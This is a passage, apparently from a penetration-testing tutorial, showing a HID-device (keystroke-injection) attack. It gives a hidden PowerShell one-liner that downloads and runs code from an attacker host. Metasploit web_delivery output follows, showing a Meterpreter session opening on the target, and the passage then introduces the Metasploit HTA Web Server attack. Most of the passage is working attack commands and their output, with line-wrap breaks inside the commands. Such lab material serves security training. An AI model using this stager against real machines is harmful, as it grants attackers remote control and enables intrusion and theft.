```
net.webclient;$P.proxy=[Net.WebRequest]:
:GetSystemWebProxy();
$P.Proxy.Credentials=[Net.CredentialCache]:
:DefaultCredentials;IEX $P.downloadstring
('http://192.168.216.5/');
```

+   2. Now, all we need to use our preferred HID device is to type the following command:

```
powershell.exe -nop -w hidden -c $P=new-object
net.webclient;$P.proxy=[Net.WebRequest]:
:GetSystemWebProxy();
$P.Proxy.Credentials=[Net.CredentialCache]:
.DefaultCredentials;IEX $P.downloadstring
('http://192.168.216.5/');
```

When inserting the HID device on the target machine, it will use windows + R to open the Run dialog box and we type our command:

![](bbox=[0.32, 0.38, 0.675, 0.51])

Which should give us a new session, as we can see:

```
[*] 192.168.216.151 web_delivery - Delivering Payload
[*] https://192.168.216.5:8443 handling request from
192.168.216.151; (UUID: xmienekf) Staging x86 payload
(180825 bytes) ...
[*] Meterpreter session 1 opened (192.168.216.5:8443
-> 192.168.216.151:50955) at 2017-12-23 11:21:45 -0500
```

# HTA attack

HTML Application (HTA) is an HTML Microsoft Windows program capable of running scripting languages, such as VBScript or JScript. The Metasploit HTA Web Server exploit module hosts an HTA that when opened runs a payload via PowerShell.